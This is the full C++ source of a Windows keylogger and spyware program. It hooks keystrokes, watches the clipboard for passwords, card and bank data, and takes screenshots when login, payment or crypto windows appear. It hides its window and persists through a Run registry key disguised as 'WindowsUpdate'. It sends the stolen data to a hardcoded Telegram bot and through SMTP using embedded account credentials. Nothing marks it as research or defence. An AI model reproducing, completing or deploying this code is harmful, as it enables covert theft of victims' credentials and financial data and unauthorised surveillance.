// ========== FIXED HEADERS WITH OPENSSL ==========
#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>

// OpenSSL headers
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/crypto.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// OpenSSL libraries
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

// ========== CONSTANTS ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const char* SMTP_SERVER = "smtp.zoho.com";
const int SMTP_PORT = 465;
const char* SMTP_USERNAME = "jesko200233@zohomail.com";
const char* SMTP_PASSWORD = "pPzx2QZBaAWd";
const char* EMAIL_TO = "josephogidiagba49@gmail.com";
const char* EMAIL_FROM = "jesko200233@zohomail.com";

// Screenshot settings
const int MAX_SCREENSHOTS_PER_HOUR = 20;
const int MIN_SCREENSHOT_INTERVAL = 30; // seconds
const int KEYSTROKE_BURST_THRESHOLD = 50; // keys in 10 seconds

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, contextLock, screenshotLock, activityLock;
HANDLE hHttpSession = NULL;
HHOOK keyboardHook = NULL;
bool running = true;
std::wstring activeWindowTitle;
std::map<std::wstring, std::wstring> credentialCache;
std::wstring systemID, computerName, userName, macAddress, windowsVersion;

// ========== OPENSSL GLOBALS ==========
SSL_CTX* ssl_ctx = nullptr;
bool openssl_initialized = false;

// ========== SMART SCREENSHOT SYSTEM ==========

enum class TriggerEvent {
    KEYSTROKE_BURST,
    CLIPBOARD_SENSITIVE,
    WINDOW_CHANGE,
    LOGIN_ATTEMPT,
    PAYMENT_SCREEN,
    PERIODIC_SAMPLE,
    APPLICATION_LAUNCH,
    FILE_ACCESS
};

struct ActivityTracker {
    ULONGLONG lastKeystrokeTime = 0;
    int keystrokeCount = 0;
    std::wstring lastWindowTitle;
    ULONGLONG lastScreenshotTime = 0;
    std::queue<TriggerEvent> pendingTriggers;
    int screenshotCounter = 0;
};

ActivityTracker activityTracker;

const std::vector<std::wstring> HIGH_VALUE_WINDOWS = {
    L"login", L"sign in", L"password", L"bank", L"paypal", L"credit card",
    L"bitcoin", L"crypto", L"email", L"gmail", L"outlook", L"yahoo",
    L"facebook", L"whatsapp", L"telegram", L"discord", L"skype",
    L"administrator", L"control panel", L"settings", L"cmd.exe",
    L"powershell", L"command prompt", L"task manager", L"regedit"
};

// ========== FUNCTION DECLARATIONS ==========
void clipboard_monitor();
void smart_screenshot_monitor();
void initialize_smart_screenshot();
bool capture_screenshot();
void deliver_screenshot(const std::vector<BYTE>& screenshot, const std::wstring& context);
void analyze_user_activity();
void record_keystroke_activity();
void check_for_high_value_window(const std::wstring& windowTitle);
void trigger_screenshot_for_sensitive_clipboard();
bool should_take_screenshot(TriggerEvent event);
std::wstring get_active_window_title();
std::vector<BYTE> compress_bitmap_to_jpeg(const std::vector<BYTE>& bmpData);

// SMTP Functions
bool init_openssl();
void cleanup_openssl();
bool send_smtp_email_ssl(const std::string& subject, const std::string& body);
std::string base64_encode(const std::string& input);
bool smtp_send_command(SSL* ssl, const std::string& cmd, const std::string& expected_response);
std::string smtp_read_response(SSL* ssl);

// Utility Functions
void send_telegram(const std::wstring& message);
void send_email_report(const std::wstring& title, const std::wstring& content, bool urgent = false);
void deliver_report(const std::wstring& message, bool urgent = false);
std::string url_encode(const std::string& input);
std::string wstring_to_utf8(const std::wstring& wstr);
std::wstring utf8_to_wstring(const std::string& str);
bool init_winhttp();
void stealth_init();
void persistence();
std::wstring GetSystemIdentifier();
bool install_keyboard_hook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// ========== OPENSSL SMTP IMPLEMENTATION ==========

bool init_openssl() {
    if (openssl_initialized) return true;
    
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    
    ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!ssl_ctx) {
        return false;
    }
    
    SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_verify_depth(ssl_ctx, 0);
    
    // Set minimum TLS version to 1.2
    SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);
    
    openssl_initialized = true;
    return true;
}

void cleanup_openssl() {
    if (ssl_ctx) {
        SSL_CTX_free(ssl_ctx);
        ssl_ctx = nullptr;
    }
    
    if (openssl_initialized) {
        EVP_cleanup();
        openssl_initialized = false;
    }
}

std::string smtp_read_response(SSL* ssl) {
    char buffer[4096];
    std::string response;
    
    int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
    if (bytes > 0) {
        buffer[bytes] = '\0';
        response = buffer;
    }
    
    return response;
}

bool smtp_send_command(SSL* ssl, const std::string& cmd, const std::string& expected_response) {
    std::string full_cmd = cmd + "\r\n";
    SSL_write(ssl, full_cmd.c_str(), (int)full_cmd.length());
    
    // Read response
    std::string response = smtp_read_response(ssl);
    
    // Check if response starts with expected code
    return response.find(expected_response) == 0;
}

bool send_smtp_email_ssl(const std::string& subject, const std::string& body) {
    if (!init_openssl()) {
        return false;
    }
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    // Set timeout
    int timeout = 15000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Connect to SMTP server
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SMTP_PORT);
    
    addrinfo hints = {0}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(SMTP_SERVER, nullptr, &hints, &result) != 0 || !result) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    serverAddr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
    freeaddrinfo(result);
    
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    // Create SSL connection
    SSL* ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, (int)sock);
    
    if (SSL_connect(ssl) <= 0) {
        SSL_free(ssl);
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    bool success = false;
    
    try {
        // Read server greeting
        std::string response = smtp_read_response(ssl);
        if (response.empty() || response.find("220") != 0) {
            throw std::runtime_error("Invalid SMTP greeting");
        }
        
        // Send EHLO
        if (!smtp_send_command(ssl, "EHLO client", "250")) {
            throw std::runtime_error("EHLO failed");
        }
        
        // Authentication
        if (!smtp_send_command(ssl, "AUTH LOGIN", "334")) {
            throw std::runtime_error("AUTH LOGIN failed");
        }
        
        // Send username (base64 encoded)
        std::string username_b64 = base64_encode(SMTP_USERNAME);
        if (!smtp_send_command(ssl, username_b64, "334")) {
            throw std::runtime_error("Username auth failed");
        }
        
        // Send password (base64 encoded)
        std::string password_b64 = base64_encode(SMTP_PASSWORD);
        if (!smtp_send_command(ssl, password_b64, "235")) {
            throw std::runtime_error("Password auth failed");
        }
        
        // MAIL FROM
        std::string mail_from = "MAIL FROM: <" + std::string(SMTP_USERNAME) + ">";
        if (!smtp_send_command(ssl, mail_from, "250")) {
            throw std::runtime_error("MAIL FROM failed");
        }
        
        // RCPT TO
        std::string rcpt_to = "RCPT TO: <" + std::string(EMAIL_TO) + ">";
        if (!smtp_send_command(ssl, rcpt_to, "250")) {
            throw std::runtime_error("RCPT TO failed");
        }
        
        // DATA
        if (!smtp_send_command(ssl, "DATA", "354")) {
            throw std::runtime_error("DATA command failed");
        }
        
        // Email headers and body
        std::string email_data = 
            "From: " + std::string(SMTP_USERNAME) + "\r\n" +
            "To: " + std::string(EMAIL_TO) + "\r\n" +
            "Subject: " + subject + "\r\n" +
            "MIME-Version: 1.0\r\n" +
            "Content-Type: text/plain; charset=utf-8\r\n" +
            "Content-Transfer-Encoding: 8bit\r\n" +
            "\r\n" +
            body + "\r\n" +
            ".\r\n";
        
        if (!smtp_send_command(ssl, email_data, "250")) {
            throw std::runtime_error("Message sending failed");
        }
        
        // QUIT
        smtp_send_command(ssl, "QUIT", "221");
        
        success = true;
    }
    catch (const std::exception&) {
        success = false;
    }
    
    // Cleanup
    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(sock);
    WSACleanup();
    
    return success;
}

// ========== UTILITY FUNCTIONS ==========

std::string base64_encode(const std::string& input) {
    static const char base64_chars[] = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string encoded;
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    for (size_t j = 0; j < input.size(); j++) {
        char_array_3[i++] = input[j];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (int k = 0; k < 4; k++) {
                encoded += base64_chars[char_array_4[k]];
            }
            i = 0;
        }
    }
    
    if (i > 0) {
        for (int j = i; j < 3; j++) {
            char_array_3[j] = '\0';
        }
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        
        for (int j = 0; j < i + 1; j++) {
            encoded += base64_chars[char_array_4[j]];
        }
        
        while (i++ < 3) {
            encoded += '=';
        }
    }
    
    return encoded;
}

std::string url_encode(const std::string& input) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else if (c == ' ') {
            escaped << '+';
        } else {
            escaped << '%' << std::setw(2) << static_cast<int>(c);
        }
    }
    return escaped.str();
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    if (!strTo.empty()) strTo.pop_back();
    return strTo;
}

std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstrTo[0], size_needed);
    if (!wstrTo.empty()) wstrTo.pop_back();
    return wstrTo;
}

// ========== TELEGRAM FUNCTIONS ==========

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) {
        utf8_msg = utf8_msg.substr(0, 3900) + "...";
    }
    
    std::string encoded_msg = url_encode(utf8_msg);
    
    std::wstring token_str(BOT_TOKEN);
    std::wstring chat_str(CHAT_ID);
    std::string path = "/bot" + wstring_to_utf8(token_str) +
                      "/sendMessage?chat_id=" + wstring_to_utf8(chat_str) +
                      "&text=" + encoded_msg;
    
    std::wstring wpath = utf8_to_wstring(path);
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        
        DWORD status = 0;
        DWORD size = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &size, NULL);
        
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

// ========== EMAIL REPORTING ==========

void send_email_report(const std::wstring& title, const std::wstring& content, bool urgent) {
    std::thread([title, content, urgent]() {
        std::string subject = wstring_to_utf8(title);
        std::string body = wstring_to_utf8(content);
        
        // Add system info to email
        body += "\n\n--- System Information ---\n";
        body += "System ID: " + wstring_to_utf8(systemID) + "\n";
        body += "User: " + wstring_to_utf8(userName) + "\n";
        body += "Computer: " + wstring_to_utf8(computerName) + "\n";
        body += "Time: " + std::to_string(GetTickCount64());
        
        // Try to send via SMTP with SSL
        send_smtp_email_ssl(subject, body);
    }).detach();
}

void deliver_report(const std::wstring& message, bool urgent) {
    // Always send to Telegram
    send_telegram(message);
    
    // Send to Email for urgent/important reports
    if (urgent) {
        std::wstring title = L"🔔 Urgent Activity Detected";
        send_email_report(title, message, true);
    }
}

// ========== SYSTEM FUNCTIONS ==========

void stealth_init() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

void persistence() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

std::wstring GetSystemIdentifier() {
    wchar_t username[256], compname[256];
    DWORD usernamelen = 256, compnamelen = 256;
    
    GetUserNameW(username, &usernamelen);
    GetComputerNameW(compname, &compnamelen);
    
    userName = username;
    computerName = compname;
    
    // MAC Address
    ULONG BufferLength = 0;
    GetAdaptersInfo(NULL, &BufferLength);
    PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)malloc(BufferLength);
    GetAdaptersInfo(pAdapter, &BufferLength);
    
    if (pAdapter) {
        macAddress = utf8_to_wstring(pAdapter->AddressString);
    }
    free(pAdapter);
    
    // Windows Version
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    windowsVersion = std::to_wstring(osvi.dwMajorVersion) + L"." + 
                    std::to_wstring(osvi.dwMinorVersion);
    
    std::wstring sid = L"SYS-" + computerName + L"-" + userName;
    systemID = sid;
    return sid;
}

// ========== KEYBOARD HOOK ==========

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            EnterCriticalSection(&keyLock);
            
            // Record activity for smart screenshot
            record_keystroke_activity();
            
            // Convert virtual key to character
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            WCHAR buffer[16];
            int result = ToUnicode(pKey->vkCode, pKey->scanCode, 
                                 keyboardState, buffer, 16, 0);
            
            if (result > 0) {
                keyBuffer += buffer[0];
                
                // Send every 100 characters
                if (keyBuffer.length() >= 100) {
                    std::wstring temp = keyBuffer;
                    keyBuffer.clear();
                    LeaveCriticalSection(&keyLock);
                    
                    std::thread([temp]() {
                        deliver_report(L"⌨️ Keystrokes:\n" + temp, false);
                    }).detach();
                    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                }
            }
            
            LeaveCriticalSection(&keyLock);
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook() {
    keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    return keyboardHook != NULL;
}

// ========== CLIPBOARD MONITOR ==========

void clipboard_monitor() {
    std::wstring lastClipboard;
    
    while (running) {
        Sleep(1000);
        
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* pszText = (wchar_t*)GlobalLock(hData);
                if (pszText) {
                    std::wstring currentClip(pszText);
                    if (!currentClip.empty() && currentClip != lastClipboard) {
                        lastClipboard = currentClip;
                        
                        // Check if clipboard contains sensitive data
                        bool isSensitive = false;
                        std::wstring lowerClip = currentClip;
                        std::transform(lowerClip.begin(), lowerClip.end(), 
                                     lowerClip.begin(), ::towlower);
                        
                        if (lowerClip.find(L"password") != std::wstring::npos ||
                            lowerClip.find(L"@gmail.com") != std::wstring::npos ||
                            lowerClip.find(L"@yahoo.com") != std::wstring::npos ||
                            lowerClip.find(L"card") != std::wstring::npos ||
                            lowerClip.find(L"bank") != std::wstring::npos ||
                            lowerClip.find(L"login") != std::wstring::npos) {
                            isSensitive = true;
                            
                            // Trigger screenshot for sensitive clipboard
                            trigger_screenshot_for_sensitive_clipboard();
                        }
                        
                        // Send clipboard data
                        deliver_report(L"📋 Clipboard:\n" + currentClip, isSensitive);
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
    }
}

// ========== SMART SCREENSHOT FUNCTIONS ==========

void initialize_smart_screenshot() {
    InitializeCriticalSection(&screenshotLock);
    InitializeCriticalSection(&activityLock);
    
    // Start smart screenshot monitor thread
    std::thread(smart_screenshot_monitor).detach();
    
    // Start activity analyzer thread
    std::thread([]() {
        while (running) {
            analyze_user_activity();
            Sleep(5000);
        }
    }).detach();
}

void smart_screenshot_monitor() {
    while (running) {
        EnterCriticalSection(&activityLock);
        bool hasTriggers = !activityTracker.pendingTriggers.empty();
        
        if (hasTriggers) {
            TriggerEvent event = activityTracker.pendingTriggers.front();
            activityTracker.pendingTriggers.pop();
            LeaveCriticalSection(&activityLock);
            
            if (should_take_screenshot(event)) {
                if (capture_screenshot()) {
                    EnterCriticalSection(&screenshotLock);
                    if (!screenshotBuffer.empty()) {
                        std::vector<BYTE> tempBuffer = screenshotBuffer;
                        std::wstring windowTitle = get_active_window_title();
                        std::wstring context = L"Trigger: ";
                        
                        switch (event) {
                            case TriggerEvent::KEYSTROKE_BURST:
                                context += L"Typing Burst";
                                break;
                            case TriggerEvent::CLIPBOARD_SENSITIVE:
                                context += L"Sensitive Clipboard";
                                break;
                            case TriggerEvent::WINDOW_CHANGE:
                                context += L"High-Value Window";
                                break;
                            case TriggerEvent::LOGIN_ATTEMPT:
                                context += L"Login Screen";
                                break;
                            case TriggerEvent::PAYMENT_SCREEN:
                                context += L"Payment Screen";
                                break;
                            default:
                                context += L"Activity";
                        }
                        
                        screenshotBuffer.clear();
                        LeaveCriticalSection(&screenshotLock);
                        
                        // Deliver in separate thread
                        std::thread([tempBuffer, windowTitle, context]() {
                            deliver_screenshot(tempBuffer, context + L"\nWindow: " + windowTitle);
                        }).detach();
                    } else {
                        LeaveCriticalSection(&screenshotLock);
                    }
                }
            }
        } else {
            LeaveCriticalSection(&activityLock);
            Sleep(1000);
        }
    }
}

void analyze_user_activity() {
    ULONGLONG currentTime = GetTickCount64();
    
    EnterCriticalSection(&activityLock);
    
    // Check for keystroke bursts
    if (activityTracker.keystrokeCount > KEYSTROKE_BURST_THRESHOLD) {
        if (currentTime - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
            activityTracker.pendingTriggers.push(TriggerEvent::KEYSTROKE_BURST);
            activityTracker.keystrokeCount = 0;
        }
    }
    
    // Reset keystroke count if no activity for 10 seconds
    if (currentTime - activityTracker.lastKeystrokeTime > 10000) {
        activityTracker.keystrokeCount = 0;
    }
    
    // Check current window
    std::wstring currentWindow = get_active_window_title();
    if (!currentWindow.empty() && currentWindow != activityTracker.lastWindowTitle) {
        activityTracker.lastWindowTitle = currentWindow;
        check_for_high_value_window(currentWindow);
    }
    
    LeaveCriticalSection(&activityLock);
}

void record_keystroke_activity() {
    ULONGLONG currentTime = GetTickCount64();
    
    EnterCriticalSection(&activityLock);
    activityTracker.keystrokeCount++;
    activityTracker.lastKeystrokeTime = currentTime;
    
    if (activityTracker.keystrokeCount >= KEYSTROKE_BURST_THRESHOLD) {
        if (currentTime - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
            activityTracker.pendingTriggers.push(TriggerEvent::KEYSTROKE_BURST);
        }
    }
    LeaveCriticalSection(&activityLock);
}

void check_for_high_value_window(const std::wstring& windowTitle) {
    std::wstring lowerTitle = windowTitle;
    std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::towlower);
    
    bool isHighValue = false;
    TriggerEvent eventType = TriggerEvent::WINDOW_CHANGE;
    
    for (const auto& keyword : HIGH_VALUE_WINDOWS) {
        if (lowerTitle.find(keyword) != std::wstring::npos) {
            isHighValue = true;
            
            if (keyword.find(L"login") != std::wstring::npos || 
                keyword.find(L"password") != std::wstring::npos ||
                keyword.find(L"sign in") != std::wstring::npos) {
                eventType = TriggerEvent::LOGIN_ATTEMPT;
            } else if (keyword.find(L"bank") != std::wstring::npos ||
                      keyword.find(L"pay") != std::wstring::npos ||
                      keyword.find(L"card") != std::wstring::npos ||
                      keyword.find(L"crypto") != std::wstring::npos) {
                eventType = TriggerEvent::PAYMENT_SCREEN;
            }
            break;
        }
    }
    
    if (isHighValue) {
        ULONGLONG currentTime = GetTickCount64();
        EnterCriticalSection(&activityLock);
        if (currentTime - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
            activityTracker.pendingTriggers.push(eventType);
        }
        LeaveCriticalSection(&activityLock);
    }
}

void trigger_screenshot_for_sensitive_clipboard() {
    ULONGLONG currentTime = GetTickCount64();
    EnterCriticalSection(&activityLock);
    if (currentTime - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
        activityTracker.pendingTriggers.push(TriggerEvent::CLIPBOARD_SENSITIVE);
    }
    LeaveCriticalSection(&activityLock);
}

bool should_take_screenshot(TriggerEvent event) {
    ULONGLONG currentTime = GetTickCount64();
    
    EnterCriticalSection(&activityLock);
    
    if (activityTracker.screenshotCounter >= MAX_SCREENSHOTS_PER_HOUR) {
        LeaveCriticalSection(&activityLock);
        return false;
    }
    
    if (currentTime - activityTracker.lastScreenshotTime < MIN_SCREENSHOT_INTERVAL * 1000) {
        LeaveCriticalSection(&activityLock);
        return false;
    }
    
    // Check user is active
    LASTINPUTINFO lastInput;
    lastInput.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lastInput)) {
        DWORD idleTime = (GetTickCount() - lastInput.dwTime) / 1000;
        if (idleTime > 300) { // 5 minutes idle
            LeaveCriticalSection(&activityLock);
            return false;
        }
    }
    
    activityTracker.lastScreenshotTime = currentTime;
    activityTracker.screenshotCounter++;
    
    static ULONGLONG lastResetTime = currentTime;
    if (currentTime - lastResetTime > 3600000) {
        activityTracker.screenshotCounter = 0;
        lastResetTime = currentTime;
    }
    
    LeaveCriticalSection(&activityLock);
    return true;
}

bool capture_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Capture at 50% resolution for efficiency
    int captureWidth = screenWidth / 2;
    int captureHeight = screenHeight / 2;
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    SetStretchBltMode(hdcMem, HALFTONE);
    StretchBlt(hdcMem, 0, 0, captureWidth, captureHeight, 
               hdcScreen, 0, 0, screenWidth, screenHeight, SRCCOPY);
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = captureWidth;
    bi.biHeight = captureHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD dwBmpSize = ((captureWidth * 3 + 3) & ~3) * captureHeight;
    
    std::vector<BYTE> bmpData(dwBmpSize);
    GetDIBits(hdcMem, hBitmap, 0, captureHeight, bmpData.data(), 
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    EnterCriticalSection(&screenshotLock);
    screenshotBuffer = compress_bitmap_to_jpeg(bmpData);
    LeaveCriticalSection(&screenshotLock);
    
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return !screenshotBuffer.empty();
}

std::vector<BYTE> compress_bitmap_to_jpeg(const std::vector<BYTE>& bmpData) {
    // Simple compression
    std::vector<BYTE> compressed;
    const int downscale = 2;
    const BYTE* src = bmpData.data();
    size_t srcSize = bmpData.size();
    
    compressed.reserve(srcSize / 4);
    
    for (size_t i = 0; i < srcSize; i += downscale * 3) {
        if (i + 2 < srcSize) {
            compressed.push_back(src[i]);
            compressed.push_back(src[i + 1]);
            compressed.push_back(src[i + 2]);
        }
    }
    
    return compressed;
}

std::wstring get_active_window_title() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        wchar_t title[256];
        GetWindowTextW(hwnd, title, 256);
        return std::wstring(title);
    }
    return L"";
}

void deliver_screenshot(const std::vector<BYTE>& screenshot, const std::wstring& context) {
    if (screenshot.empty()) return;
    
    std::wstring message = L"📸 Smart Screenshot Captured\n";
    message += context + L"\n";
    message += L"Size: " + std::to_wstring(screenshot.size()) + L" bytes\n";
    message += L"Time: " + std::to_wstring(GetTickCount64());
    
    // Send to Telegram
    send_telegram(message);
    
    // Send to Email as urgent
    send_email_report(L"Smart Screenshot Captured", context, true);
}

// ========== MAIN FUNCTION ==========

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPWSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    
    // Initialize system identification
    systemID = GetSystemIdentifier();
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&contextLock);
    
    // Initialize OpenSSL for SMTP
    init_openssl();
    
    // Initialize smart screenshot system
    initialize_smart_screenshot();
    
    stealth_init();
    persistence();
    
    if (init_winhttp()) {
        std::wstring activationMsg = L"🚀 [CHANGES v5.0 - SMTP + SCREENSHOT EDITION] ACTIVATED\n";
        activationMsg += L"🖥️ SYSTEM: " + systemID + L"\n";
        activationMsg += L"👤 USER: " + userName + L"\n";
        activationMsg += L"💻 COMPUTER: " + computerName + L"\n";
        activationMsg += L"🔗 MAC: " + macAddress + L"\n";
        activationMsg += L"🪟 Windows " + windowsVersion + L"\n";
        activationMsg += L"📧 SMTP (SSL): " + (strlen(SMTP_PASSWORD) > 0 ? L"ENABLED" : L"DISABLED") + L"\n";
        activationMsg += L"📱 Telegram: ENABLED\n";
        activationMsg += L"📸 Smart Screenshot: ENABLED\n";
        activationMsg += L"✅ COMPATIBILITY: Windows 7/8/10/11";
        
        // Send activation to BOTH Telegram and Email
        send_telegram(activationMsg);
        send_email_report(L"System Activated", activationMsg, true);
        
        if (!install_keyboard_hook()) {
            deliver_report(L"❌ Failed to install keyboard hook", true);
            return 1;
        }
        
        std::thread clipboard_thread(clipboard_monitor);
        clipboard_thread.detach();
        
        // Main message loop
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) && running) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    
    // Cleanup
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&contextLock);
    DeleteCriticalSection(&screenshotLock);
    DeleteCriticalSection(&activityLock);
    
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    cleanup_openssl();
    
    return 0;
}
